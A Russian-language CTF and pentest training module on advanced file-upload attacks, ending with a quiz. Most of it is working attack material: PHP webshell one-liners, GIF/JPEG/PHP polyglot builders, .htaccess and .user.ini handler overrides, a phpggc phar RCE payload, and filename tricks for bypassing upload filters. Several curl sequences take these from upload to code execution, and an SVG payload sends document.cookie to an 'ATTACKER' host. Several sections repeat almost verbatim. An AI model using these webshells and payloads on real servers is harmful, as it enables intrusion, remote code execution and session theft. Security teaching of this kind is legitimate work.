---
id: web-file-upload-advanced
title: "File-upload advanced: полиглоты, .htaccess, SVG, nginx, phar"
category: web
parent: web-file-upload
difficulty: hard
order: 3
tags: [file-upload, polyglot, htaccess, svg, phar, rce]
prerequisites: [web-file-upload]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 46
summary: "Продвинутый обход загрузки файлов: полиглоты, .htaccess/.user.ini, SVG XSS/XXE, конфиги nginx, phar-десериализация."
---

Базовая загрузка файла (`web-file-upload`) — это про обход расширений и MIME. Продвинутый уровень — про то, как **заставить сервер исполнить** загруженный контент там, где обычный `.php` не проходит: через полиглоты, `.htaccess`, SVG, конфиги nginx и phar-метаданные. Здесь меньше «угадывания расширения» и больше анализа, как сервер обрабатывает загруженное.

## Техника 1: полиглоты

Полиглот — файл, валидный сразу для двух форматов. Классика: GIF+PHP, где PHP-код спрятан в комментарии GIF, а заголовок `GIF89a` проходит проверку `getimagesize`/magic-bytes:

```php
GIF89a
<?php system($_GET['c']); ?>
```

Если фильтр проверяет только первые байты (magic), а сервер исполняет `.php` — полиглот проходит. Аналогично JPEG+PHP, PNG+PHP (с корректным размером чанков). Генерация:

```bash
# GIF+PHP
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php
# JPEG+PHP (через exiftool, комментарий)
exiftool -Comment='<?php system($_GET["c"]); ?>' shell.jpg -o shell.jpg.php
```

## Техника 2: .htaccess / .user.ini

Если загрузка разрешает файлы, начинающиеся с `.` (или обходит фильтр для них), можно **изменить поведение Apache**: заставить его исполнять `.jpg` как PHP.

`.htaccess`:

```apache
AddType application/x-httpd-php .jpg
# или
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

`.user.ini` (PHP-FPM/nginx):

```ini
auto_prepend_file=shell.jpg
```

Шаги: загружаем `.htaccess`, затем `shell.jpg` с PHP-кодом, затем запрашиваем `shell.jpg` → исполняется.

## Техника 3: SVG

SVG — это XML, который браузер исполняет; в нём можно встроить JS (stored XSS) и внешние сущности (XXE):

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://ATTACKER/?c='+document.cookie)</script>
</svg>
```

Если SVG отдаётся с `Content-Type: image/svg+xml` и открывается напрямую — XSS. Внутри `<image href="...">` и `<!ENTITY>` — SSRF/XXE.

## Техника 4: конфиги nginx

Если загрузка кладёт файлы в каталог, который nginx конфигурирует, и можно влиять на конфиг (`/etc/nginx/conf.d/`), то `location` с `fastcgi_pass` может дать исполнение. Чаще встречается в CTF: загруженный `.conf` интерпретируется как конфиг. Проверяйте пути вроде `/etc/nginx/sites-enabled/`.

## Техника 5: phar

Phar-файл можно замаскировать под картинку (stub `GIF89a`), а внутри — метаданные с POP-цепочкой. При обращении к `phar://` (через любую файловую функцию) метаданные десериализуются → RCE (см. `web-php-deser-chains`, `web-php-tricks`):

```bash
./phpggc -p phar -o shell.jpg Monolog/RCE1 system id
```

Расширение неважно — важно, что файл валидный phar.

## Техника 6: обход фильтров

- **Двойное расширение:** `shell.php.jpg`, `shell.jpg.php`.
- **Регистр:** `shell.PHP`, `shell.PhP`.
- **Trailing-символы:** `shell.php%00.jpg` (null byte, старые), `shell.php.` (точка), `shell.php ` (пробел), `shell.php::$DATA` (NTFS ADS).
- **Спецсимволы:** `shell.php/.`, `shell.php\x00`.
- **Content-Type:** подмена на `image/jpeg` при `Content-Type`-проверке.
- **Двойное кодирование:** `shell%252ephp`.
- **Архив:** загрузка zip, внутри — `.php` (см. `web-zip-slip`).

## Разобранный пример: .htaccess → RCE

Шаг 1 — загружаем `.htaccess`:

```bash
printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
curl -s -F "file=@.htaccess" https://app.example/upload
```

Шаг 2 — загружаем картинку с PHP:

```bash
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.jpg
curl -s -F "file=@shell.jpg;type=image/jpeg" https://app.example/upload
```

Шаг 3 — исполняем:

```bash
curl -s "https://app.example/uploads/shell.jpg?c=id"
```

## Разобранный пример: SVG XSS

```bash
curl -s -F "file=@evil.svg;type=image/svg+xml" https://app.example/avatar
# evil.svg: <svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
curl -s "https://app.example/uploads/evil.svg"   # откроется в браузере -> XSS
```

## Что проверять

- Куда попадает файл (URL после загрузки) и исполняется ли он.
- Разрешённые расширения/типы; как проверяется (magic, расширение, MIME).
- Можно ли загрузить `.htaccess`/`.user.ini`/`.svg`/`.phar`-совместимый.
- Отдаётся ли загруженное с опасным `Content-Type`.

## Инструменты

- **Burp Intruder** — перебор расширений/обходов.
- **`exiftool`** — вставка PHP в метаданные JPEG.
- **`phpggc -p phar`** — phar-payload.
- **`ffuf`** — поиск каталога загрузок (см. `web-tool-ffuf`).
- **`Gifsicle`/`ImageMagick`** — валидные полиглоты.

## Что дальше / decision

1. Загрузка разрешена → определите, исполняется ли загруженное.
2. Обычный `.php` блокируется → `.htaccess`/`.user.ini`, полиглот.
3. Разрешён SVG → XSS/XXE.
4. Есть LFI/файловые функции → `phar://`-триггер.
5. RCE → устойчивый канал + read-back.

## Частые ошибки

- **Проверять только расширение.** Magic/MIME тоже проверяются — нужен полиглот.
- **Забыть про `.htaccess`.** Он превращает картинку в PHP.
- **Игнорировать SVG.** Это XML с JS/XXE.
- **Путать phar и обычный архив.** Phar триггерит десериализацию.
- **Ломать прод.** Загрузка webshell — только с согласия.

## Обход фильтров загрузки: полная таблица

Фильтры загрузки проверяют расширение, MIME, магические байты, размер, содержимое. Каждому — свой обход.

| Фильтр | Обход |
|--------|-------|
| Чёрный список `.php` | `.phtml`, `.php5`, `.phar`, `.pht`, `.php7` |
| Белый список картинок | polyglot GIF/PHP, `exif`-инъекция |
| `Content-Type` | подменить заголовок на `image/png` |
| Magic bytes | добавить `GIF89a;` в начало |
| Двойное расширение | `shell.php.jpg`, `shell.jpg.php` |
| Null byte | `shell.php%00.jpg` (старые версии) |
| Регистр | `shell.PHP`, `shell.pHp` |
| Trailing dot/space | `shell.php.`, `shell.php ` |
| Проверка размера | polyglot минимального размера |

```bash
# обход magic bytes + Content-Type
printf 'GIF89a;<?php system($_GET["c"]); ?>' > shell.gif
curl -s -F 'file=@shell.gif;type=image/gif' https://app.example/upload
# вызов
curl -s 'https://app.example/uploads/shell.gif?c=id'
```

## Полиглоты: как собрать рабочий файл

Полиглот — файл, валидный и как изображение, и как скрипт.

```bash
# 1) GIF/PHP: минимальный GIF-заголовок + PHP
printf 'GIF89a<?php system($_GET[0]); ?>' > p.gif
# 2) JPEG/PHP через exif-комментарий
exiftool -Comment='<?php system($_GET[0]); ?>' img.jpg -o shell.jpg
# 3) ZIP/PHP (phar) — см. ниже
# 4) SVG/PHP не сработает как PHP, но как XSS — да
```

```php
// phar: PHP-код внутри ZIP/JPG, исполняется через phar://
// создаём архив с файлом evil.php и обращаемся phar://uploads/x.zip/evil
```

## .htaccess и .user.ini: включение исполнения

Если можно загрузить `.htaccess` (Apache) — можно «научить» сервер исполнять картинки как PHP.

```apache
# .htaccess: исполнять .gif как PHP
AddType application/x-httpd-php .gif
# или переопределить handler
<FilesMatch ".gif$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```bash
curl -s -F 'file=@.htaccess' https://app.example/upload
curl -s -F 'file=@shell.gif' https://app.example/upload
curl -s 'https://app.example/uploads/shell.gif?c=id'
```

`.user.ini` (PHP-FPM) задаёт `auto_prepend_file` — можно подключать свой файл.

## nginx и конфиги: опасные директивы

```nginx
# уязвимая конфигурация: загрузка в директорию с PHP-локейшеном
location /uploads/ { root /var/www; }      # .php в uploads не исполняется -> ок
location ~ \.php$ { fastcgi_pass ...; }    # но это правило может «дотянуться» до uploads
```

```bash
# проверка: загружаем .php в /uploads и пробуем вызвать
curl -s -F 'file=@shell.php' https://app.example/upload
curl -s 'https://app.example/uploads/shell.php?c=id'
# если 200 и вывод id -> конфиг опасен
```

## Разобранный пример: .htaccess → RCE

```text
1) загружаем .htaccess с AddType ... .gif
2) загружаем shell.gif (GIF89a + PHP)
3) вызываем shell.gif?c=id
4) получаем RCE
```

```bash
# всё одной серией
curl -s -F 'file=@.htaccess' https://app.example/upload
curl -s -F 'file=@shell.gif' https://app.example/upload
curl -s 'https://app.example/uploads/shell.gif?c=id'
```

## Инструменты

| Инструмент | Назначение |
|-----------|-----------|
| `exiftool` | инъекция в метаданные |
| `ffuf` | перебор расширений |
| `Burp` | подмена Content-Type |
| `weevely` | генерация webshell |
| `nuclei` | шаблоны upload |

```bash
ffuf -u https://app.example/upload -X POST -F 'file=@shell.FUZZ' \
  -w exts.txt -mr 'success|uploaded'
```

## Что делать дальше / решение

1. **Определите фильтр.** Расширение, MIME, magic, содержимое.
2. **Подберите обход.** Таблица выше.
3. **Проверьте исполнение.** Доступен ли загруженный файл и исполняется ли.
4. **Используйте .htaccess/.user.ini.** Если директория их принимает.
5. **Проверьте nginx-конфиг.** Исполняется ли `.php` в uploads.
6. **Зафиксируйте PoC.** Вывод `id` через загруженный файл.

## Практика и справочники

- **PortSwigger Academy** — «File upload vulnerabilities».
- **HackTricks** — «File Upload».
- **PayloadsAllTheThings** — «Upload Insecure Files».
- **web-upload-rce** — класс-скилл.

## Приоритеты при загрузке файлов

Начните с определения фильтра: расширение, MIME, magic bytes, содержимое. Затем подберите обход из таблицы (альтернативные расширения, двойное расширение, подмена `Content-Type`, polyglot с магическими байтами). Ключевой вопрос — **исполняется ли** загруженный файл и доступен ли он по URL. Если директория принимает `.htaccess`/`.user.ini`, загрузка становится RCE напрямую. Проверяйте также, исполняется ли `.php` в директории uploads (частая ошибка конфига nginx).

## Кратко

1. Определите фильтр.
2. Подберите обход (таблица).
3. Проверьте доступность и исполнение файла.
4. Используйте `.htaccess`/`.user.ini`.
5. Проверьте nginx-конфиг.
6. PoC — вывод `id`.

## Практика

- **PortSwigger Academy** — file upload.
- **HackTricks** — File Upload.
- **PayloadsAllTheThings** — Upload Insecure Files.

## Расширенный разбор: что проверять в первую очередь

| Шаг | Проверка | Признак |
|-----|----------|---------|
| 1 | расширения | какие принимаются |
| 2 | MIME/magic | проверяются ли реально |
| 3 | доступность файла | отдаётся ли по URL |
| 4 | исполнение | `.php`/`.phtml`/`.gif` |
| 5 | `.htaccess` | принимается ли |
| 6 | директория | uploads/static |

```bash
# минимальная серия проверок
curl -s -F 'file=@test.php' https://app.example/upload
curl -s -F 'file=@test.php.jpg' https://app.example/upload
curl -s -F 'file=@test.jpg;type=application/x-php' https://app.example/upload
curl -s -o /dev/null -w '%{http_code}\n' https://app.example/uploads/test.php
```

## Дополнительно: webshell

Для эксплуатации удобен минимальный webshell: `<?php system($_GET['c']); ?>`. Обфусцированные варианты (`<?=` с backticks, base64) помогают обойти фильтры содержимого. Не забывайте про размер: некоторые загрузчики требуют валидное изображение — тогда используйте polyglot с настоящими пиксельными данными.

## Ещё одна проверка

Отдельно проверьте загрузку **конфигурационных** файлов: `.htaccess`, `.user.ini`, `web.config`, `.conf`. Если они принимаются, это часто прямее, чем подбор расширения: вы меняете поведение сервера и включаете исполнение для уже загруженных «безобидных» файлов. В nginx-сценариях ищите, попадает ли директория uploads под PHP-локейшен.

## Квиз

```quiz
- question: "Что такое полиглот-файл?"
  options:
    - "Архив"
    - "Файл, валидный одновременно как изображение и как скрипт"
    - "Шифр"
    - "Cookie"
  answer: 1
  explanation: "Обходит проверку 'это картинка'."
- question: "Что делает .htaccess с AddType?"
  options:
    - "Сжимает"
    - "Заставляет сервер исполнять .jpg как PHP"
    - "Шифрует"
    - "Кеширует"
  answer: 1
  explanation: "Меняет обработку расширений."
- question: "Что задаёт .user.ini?"
  options:
    - "TLS"
    - "auto_prepend_file — подключает файл перед каждым PHP-скриптом"
    - "DNS"
    - "Cookie"
  answer: 1
  explanation: "Триггерит подключение загруженного файла."
- question: "Чем опасен загружаемый SVG?"
  options:
    - "Он большой"
    - "SVG — XML: возможен XSS и XXE"
    - "Он шифрует"
    - "Он кешируется"
  answer: 1
  explanation: "XML-контекст в браузере/парсере."
- question: "Как связан upload и phar?"
  options:
    - "Никак"
    - "Загруженный phar триггерит десериализацию через phar://"
    - "Через TLS"
    - "Через DNS"
  answer: 1
  explanation: "Метаданные phar десериализуются."
```

## Где пригодится

- **CTF (Web):** задачи на загрузку.
- **Bug bounty:** upload→RCE — критичный отчёт.
- **Пентест:** аудит файловых операций.
- **Работа (AppSec):** allowlist типов, хранение вне веб-рута, перекодирование изображений, запрет .htaccess/SVG.
